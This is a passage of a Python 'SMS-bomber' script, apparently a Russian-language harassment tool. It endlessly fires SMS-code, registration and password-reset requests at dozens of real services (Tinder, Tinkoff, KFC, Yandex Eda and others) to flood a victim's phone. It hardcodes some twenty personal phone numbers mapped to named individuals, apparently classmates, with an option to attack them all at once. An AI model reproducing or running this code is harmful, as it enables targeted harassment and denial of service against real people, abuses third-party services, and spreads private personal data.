                division_talk = 'минус ' + division_talk[1:]
        return(division_talk)


def DOS():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    banner = '' \
             '         *****  *     *  *****        ******  ******* *     * ******  ******* ******\n' \
             '        *     * **   ** *     *       *     * *     * **   ** *     * *       *     * \n' \
             '        *       * * * * *             *     * *     * * * * * *     * *       *     *\n' \
             '         *****  *  *  *  *****  ***** ******  *     * *  *  * ******  *****   ******\n' \
             '              * *     *       *       *     * *     * *     * *     * *       *   *\n' \
             '              * *     *       *       *     * *     * *     * *     * *       *    *\n' \
             '         *****  *     *  *****        ******  ******* *     * ******  ******* *     * \n'
    version = "Version: 1.0.6"
    sirvise = '45'
    if mess.find('клас') != -1 or mess.find('всех') != -1:
        _phone = ['79510006255', '79147194077', '79841505820', '79677543694', '79940126087', '79841461606',
                  '79025246745', '79532112364',
                  '79644493025', '79147298968', '79149626665', '79149737742', '79243399223', '79662744517',
                  '79149784708',
                  '79143227561', '79146864725', '79242454191', '79644471504', '79520840008', '79146691936',
                  '79662871237']

        _name = ''
        for index in range(20):
            for x in range(12):
                _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                password = _name + random.choice(
                    list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                username = _name + random.choice(
                    list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

            _phone9 = _phone[index][1:]
            _phoneAresBank = '+' + _phone[index][0] + '(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + \
                             _phone[index][7:9] + '-' + _phone[index][9:11]
            _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
            _phoneOstin = '+' + _phone[index][0] + '+(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + \
                          _phone[index][7:9] + '-' + _phone[index][9:11]
            _phonePizzahut = '+' + _phone[index][0] + ' (' + _phone[index][1:4] + ') ' + _phone[index][4:7] + ' ' + \
                             _phone[index][7:9] + ' ' + _phone[index][9:11]
            _phoneGorzdrav = _phone[index][1:4] + ') ' + _phone[index][4:7] + '-' + _phone[index][7:9] + '-' + \
                             _phone[index][9:11]
        iteration = 0

        while True:
            _email = _name[index] + f'{iteration}' + '@gmail.com'
            email = _name[index] + f'{iteration}' + '@gmail.com'
            print('GRAB')
            for index in range(20):
                try:
                    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                                  data={'phoneNumber': _phone[index], 'countryCode': 'ID', 'name': 'test',
                                        'email': 'mail@mail.com',
                                        'deviceToken': '*'}, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('RuTaxi')
            for index in range(20):
                try:
                    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9[index]}).json()[
                        "res"]
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('BelkaCar')
            for index in range(20):
                try:
                    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone[index]},
                                  headers={})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Tinder')
            for index in range(20):
                try:
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                  data={'phone_number': _phone[index]}, headers={})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Karusel')
            for index in range(20):
                try:
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]}, headers={})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])
            print('Tinkoff')
            for index in range(20):
                try:
                    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone[index]},
                                  headers={})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('MTS')
            for index in range(20):
                try:
                    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone[index]}, headers={})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Youla')
            for index in range(20):
                try:
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('PizzaHut')
            for index in range(20):
                try:
                    requests.post('https://pizzahut.ru/account/password-reset',
                                  data={'reset_by': 'phone', 'action_id': 'pass-recovery',
                                        'phone': _phonePizzahut[index], '_token': '*'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Rabota')
            for index in range(20):
                try:
                    requests.post('https://www.rabota.ru/remind', data={'credential': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Rutube')
            for index in range(20):
                try:
                    requests.post('https://rutube.ru/api/accounts/sendpass/phone',
                                  data={'phone': '+' + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
                    print('[+]', _phone[index])

            print('Smsint')
            for index in range(20):
                try:
                    requests.post(
                        'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                        data={'name': _name[index], 'phone': _phone[index], 'promo': 'yellowforma'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('oyorooms')
            for index in range(20):
                try:
                    requests.get(
                        'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9[
                            index] + '&country_code=%2B7&nod=4&locale=en')
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('MVideo')
            for index in range(20):
                try:
                    requests.post(
                        'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                        params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                                'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                        data={'phone': _phone[index], 'g-recaptcha-response': '', 'recaptcha': 'on'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('newnext')
            for index in range(20):
                try:
                    requests.post('https://newnext.ru/graphql',
                                  json={'operationName': 'registration', 'variables': {
                                      'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone[index],
                                                 'typeKeys': ['Unemployed']}},
                                        'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Sunlight')
            for index in range(20):
                try:
                    requests.post('https://api.sunlight.net/v3/customers/authorization/',
                                  data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('alpari')
            for index in range(20):
                try:
                    requests.post(
                        'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                        json={'client_type': 'personal', 'email': _email[index], 'mobile_phone': _phone[index],
                              'deliveryOption': 'sms'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Invitro')
            for index in range(20):
                try:
                    requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode',
                                  data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Sberbank')
            for index in range(20):
                try:
                    requests.post('https://online.sbis.ru/reg/service/',
                                  json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                        'params': {'phone': _phone[index]}, 'id': '1'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Psbank')
            for index in range(20):
                try:
                    requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                                  json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов',
                                        'sex': '1',
                                        'birthDate': '10.10.2000', 'mobilePhone': _phone9[index],
                                        'russianFederationResident': 'true',
                                        'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                        'bKIRequestAgreement': 'null',
                                        'promotionAgreement': 'true'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Beltelcom')
            for index in range(20):
                try:
                    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                                  data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Karusel')
            for index in range(20):
                try:
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('KFC')
            for index in range(20):
                try:
                    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                                  json={'phone': '+' + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('carsmile')
            for index in range(20):
                try:
                    requests.post("https://api.carsmile.com/",
                                  json={"operationName": "enterPhone", "variables": {"phone": _phone[index]},
                                        "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Citilink')
            for index in range(20):
                try:
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Delitime')
            for index in range(20):
                try:
                    requests.post("https://api.delitime.ru/api/v2/signup",
                                  data={"SignupForm[username]": _phone[index], "SignupForm[device_type]": 3})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('findclone')
            for index in range(20):
                try:
                    requests.get('https://findclone.ru/register', params={'phone': '+' + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Guru')
            for index in range(20):
                try:
                    requests.post("https://guru.taxi/api/v1/driver/session/verify",
                                  json={"phone": {"code": 1, "number": _phone[index]}})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('ICQ')
            for index in range(20):
                try:
                    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                  data={'msisdn': _phone[index], "locale": 'en', 'countryCode': 'ru',
                                        'version': '1',
                                        "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('InDriver')
            for index in range(20):
                try:
                    requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                  data={"mode": "request", "phone": "+" + _phone[index],
                                        "phone_permission": "unknown", "stream_id": 0,
                                        "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                        "devicemodel": "unknown"})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Invitro')
            for index in range(20):
                try:
                    requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                                  data={"password": password[index], "application": "lkp",
                                        "login": "+" + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Pmsm')
            for index in range(20):
                try:
                    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('IVI')
            for index in range(20):
                try:
                    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",
                                  data={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Mail.ru')
            for index in range(20):
                try:
                    requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                  json={"phone": "+" + _phone[index], "api": 2, "email": "email",
                                        "x-email": "x-email"})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('MVideo')
            for index in range(20):
                try:
                    requests.post(
                        'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                        params={"pageName": "registerPrivateUserPhoneVerificatio"},
                        data={"phone": _phone[index], "recaptcha": 'off', "g-recaptcha-response": ""})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('OK')
            for index in range(20):
                try:
                    requests.post(
                        "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                        data={"st.r.phone": "+" + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Plink')
            for index in range(20):
                try:
                    requests.post('https://plink.tech/register/', json={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('qlean')
            for index in range(20):
                try:
                    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                  json={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('SMSgorod')
            for index in range(20):
                try:
                    requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Tinder')
            for index in range(20):
                try:
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                  data={'phone_number': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Twitch')
            for index in range(20):
                try:
                    requests.post('https://passport.twitch.tv/register?trusted_request=true',
                                  json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                        "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                        "include_verification_code": True,
                                        "password": password[index], "phone_number": _phone[index],
                                        "username": username[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('CabWiFi')
            for index in range(20):
                try:
                    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone[index]},
                                  headers={'App-ID': 'cabinet'})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('wowworks')
            for index in range(20):
                try:
                    requests.post("https://api.wowworks.ru/v2/site/send-code",
                                  json={"phone": _phone[index], "type": 2})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Eda.Yandex')
            for index in range(20):
                try:
                    requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                  json={"phone_number": "+" + _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Youla')
            for index in range(20):
                try:
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Alpari')
            for index in range(20):
                try:
                    requests.post(
                        'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                        json={"client_type": "personal", "email": f"{email[index]}@gmail.ru",
                              "mobile_phone": _phone[index],
                              "deliveryOption": "sms"})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('SMS')
            for index in range(20):
                try:
                    requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                                  data={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])

            print('Delivery')
            for index in range(20):
                try:
                    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone[index]})
                    print('[+]', _phone[index])
                except:
                    print('[-]', _phone[index])
            try:
                iteration += 1
                print(('{} круг пройден.').format(iteration))
            except:
                break

    else:
        print(banner)
        if mess.find('семен') != -1 or mess.find('семён') != -1:
            print('Семён Куликов:', end=' ')
            _phone = '79147194077'
        elif mess.find('марьян') != -1:
            print('Марьяна Сидоренко:', end=' ')
            _phone = '79841505820'
        elif mess.find('вику') != -1 or mess.find('вика') != -1:
            print('Вика Гринькова:', end=' ')
            _phone = '79677543694'
        elif mess.find('глеб') != -1:
            fam = input("Гречушкин(1) или Голиков(2)").lower()
            if fam == '' or fam.find('греч') != -1 or fam == '1':
                print('Глеб Гречушкин:', end=' ')
                _phone = '79084488885'
            else:
                print('Глеб Голиков:', end=' ')
                _phone = '79940126087'
        elif mess.find('денис') != -1:
            print('Денис До:', end=' ')
            _phone = '79841461606'
        elif mess.find('диму') != -1 or mess.find('дима') != -1:
            print('Дима Лобовской:', end=' ')
            _phone = '79025246745'
        elif mess.find('егор') != -1:
            print('Егор Панарин:', end=' ')
            _phone = '79532112364'
        elif mess.find('лешу') != -1 or mess.find('лёшу') != -1 or \
                mess.find('леша') != -1 or mess.find('лёша') != -1:
            fam = input("Каптенор(1) или Еремеев(2) или Краснопеев(3)").lower()
            if fam == '' or fam.find('каптен') != -1 or fam == '1':
                print('Лёша Каптенор:', end=' ')
                _phone = '79644493025'
            elif fam == '2' or fam.find('ереме') != -1:
                print('Лёша Еремеев:', end=' ')
                _phone = '79147298968'
            else:
                print('Лёша Краснопеев:', end=' ')
                _phone = '79149626665'
        elif mess.find('данил') != -1:
            print('Данил Зяблицкий:', end=' ')
            _phone = '79149737742'
        elif mess.find('кристин') != -1:
            print('Кристина Рассказова:', end=' ')
            _phone = '79243399223'
        elif mess.find('аня') != -1 or mess.find('аню') != -1 or mess.find('анну') != -1:
            fam = input("Лударева(1) или Вычужанина(2)").lower()
            if fam == '' or fam.find('луд') != -1 or fam == '1':
                print('Аня Лударева:', end=' ')
                _phone = '79662744517'
            else:
                print('Аня Вычужанина:', end=' ')
                _phone = '79673860557'
        elif mess.find('наст') != -1 or mess.find('настю') != -1:
            print('Настя Дуровина:', end=' ')
            _phone = '79149784708'
        elif mess.find('петя') != -1 or mess.find('петю') != -1:
            print('Петя Левченко:', end=' ')
            _phone = '79143227561'
        elif mess.find('гошу') != -1 or mess.find('гоша') != -1:
            print('Гоша Савинов:', end=' ')
            _phone = '79146864725'
        elif mess.find('дашу') != -1 or mess.find('даша') != -1:
            print('Даша Мосолова:', end=' ')
            _phone = '79242454191'
        elif mess.find('соню') != -1 or mess.find('соня') != -1:
            print('Соня Киктенко:', end=' ')
            _phone = '79644471504'
        elif mess.find('мишу') != -1 or 'миша' in mess:
            # elif mess.find('мишу') != -1 or mess.find('миша') != -1:
            print('Миша Стручаев :', end=' ')
            _phone = '79520840008'
        elif mess.find('лизу') != -1 or mess.find('лиза') != -1:
            print('Лиза Толмачёва:', end=' ')
            _phone = '79146691936'
        elif mess.find('серого') != -1 or mess.find('серый') != -1 or mess.find('сергея') != -1 or mess.find(
                'сергей') != -1:
            print('Сергей Транковский:', end=' ')
            _phone = '79662871237'
        elif mess.find('меня') != -1 or mess.find(' я') != -1:
            print('Андрей Задорожный:', end=' ')
            _phone = '79510006255'
        else:
            _phone = input('Hello! Number for attack (79xxxxxxxxx)-->> ')

        if _phone[0] == '+':
            _phone = _phone[1:]
        if _phone[0] == '8':
            _phone = '7' + _phone[1:]
        if _phone[0] == '9':
            _phone = '7' + _phone

        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        _phone9 = _phone[1:]
        _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                             9:11]
        _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
        _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                               9:11]
        _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

        iteration = 0
        while True:
            _email = _name + '{iteration}' + '@gmail.com'.format(iteration)
            email = _name + '{iteration}' + '@gmail.com'.format(iteration)
            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                              data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test',
                                    'email': 'mail@mail.com', 'deviceToken': '*'}, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                print('[+] Grab отправлено!')
            except:
                print('[-] Grab не отправлено!')

            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
                print('[+] RuTaxi отправлено!')
            except:
                print('[-] RuTaxi не отправлено!')

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
                print('[+] BelkaCar отправлено!')
            except:
                print('[-] BelkaCar не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone}, headers={})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Tinder не отправлено!')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Karusel не отправлено!')

            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
                print('[+] Tinkoff отправлено!')
            except:
                print('[-] Tinkoff не отправлено!')

            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                print('[+] MTS отправлено!')
            except:
                print('[-] MTS не отправлено!')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Youla не отправлено!')

            try:
                requests.post('https://pizzahut.ru/account/password-reset',
                              data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                    '_token': '*'})
                print('[+] PizzaHut отправлено!')
            except:
                print('[-] PizzaHut не отправлено!')

            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
                print('[+] Rabota отправлено!')
            except:
                print('[-] Rabota не отправлено!')

            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
                print('[+] Rutube отправлено!')
            except:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                print('[+] Citilink отправлено!')

            try:
                requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                              data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
                print('[+] Smsint отправлено!')
            except:
                print('[-] Smsint не отправлено!')

            try:
                requests.get(
                    'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
                print('[+] Oyorooms отправлено!')
            except:
                print('[-] Oyorooms не отправлено!')

            try:
                requests.post(
                    'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                    params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                            'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                    data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
                print('[+] MVideo отправлено!')
            except:
                print('[-] MVideo не отправлено!')

            try:
                requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                    'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                                  'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                print('[+] Newnext отправлено!')
            except:
                print('[-] Newnext не отправлено!')

            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                print('[+] Sunlight отправлено!')
            except:
                print('[-] Sunlight не отправлено!')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                              json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                    'deliveryOption': 'sms'})
                print('[+] Аlpari отправлено!')
            except:
                print('[-] Аlpari не отправлено!')

            try:
                requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Invitro не отправлено!')

            try:
                requests.post('https://online.sbis.ru/reg/service/',
                              json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                    'params': {'phone': _phone}, 'id': '1'})
                print('[+] Sberbank отправлено!')
            except:
                print('[-] Sberbank не отправлено!')

            try:
                requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                              json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                    'birthDate': '10.10.2000', 'mobilePhone': _phone9,
                                    'russianFederationResident': 'true', 'isDSA': 'false',
                                    'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                                    'promotionAgreement': 'true'})
                print('[+] Psbank отправлено!')
            except:
                print('[-] Psbank не отправлено!')

            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                print('[+] Beltelcom отправлено!')
            except:
                print('[-] Beltelcom не отправлено!')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Karusel не отправлено!')

            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                              json={'phone': '+' + _phone})
                print('[+] KFC отправлено!')
            except:
                print('[-] KFC не отправлено!')

            try:
                requests.post("https://api.carsmile.com/",
                              json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                    "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                print('[+] Carsmile отправлено!')
            except:
                print('[-] Carsmile не отправлено!')

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                print('[+] Citilink отправлено!')
            except:
                print('[-] Citilink не отправлено!')

            try:
                requests.post("https://api.delitime.ru/api/v2/signup",
                              data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
                print('[+] Delitime отправлено!')
            except:
                print('[-] Delitime не отправлено!')

            try:
                requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
                print('[+] findclone звонок отправлен!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",
                              json={"phone": {"code": 1, "number": _phone}})
                print('[+] Guru отправлено!')
            except:
                print('[-] Guru не отправлено!')

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                print('[+] ICQ отправлено!')
            except:
                print('[-] ICQ не отправлено!')

            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                              data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown",
                                    "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                    "devicemodel": "unknown"})
                print('[+] InDriver отправлено!')
            except:
                print('[-] InDriver не отправлено!')

            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                              data={"password": password, "application": "lkp", "login": "+" + _phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Invitro не отправлено!')

            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
                print('[+] Pmsm отправлено!')
            except:
                print('[-] Pmsm не отправлено!')

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
                print('[+] IVI отправлено!')
            except:
                print('[-] IVI не отправлено!')

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
                print('[+] Mail.ru отправлено!')
            except:
                print('[-] Mail.ru не отправлено!')

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + _phone})
                print('[+] OK отправлено!')
            except:
                print('[-] OK не отправлено!')

            try:
                requests.post('https://plink.tech/register/', json={"phone": _phone})
                print('[+] Plink отправлено!')
            except:
                print('[-] Plink не отправлено!')

            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
                print('[+] qlean отправлено!')
            except:
                print('[-] qlean не отправлено!')

            try:
                requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                print('[+] SMSgorod отправлено!')
            except:
                print('[-] SMSgorod не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Tinder не отправлено!')

            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',
                              json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                    "password": password, "phone_number": _phone, "username": username})
                print('[+] Twitch отправлено!')
            except:
                print('[-] Twitch не отправлено!')

            try:
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                              headers={'App-ID': 'cabinet'})
                print('[+] CabWiFi отправлено!')
            except:
                print('[-] CabWiFi не отправлено!')

            try:
                requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
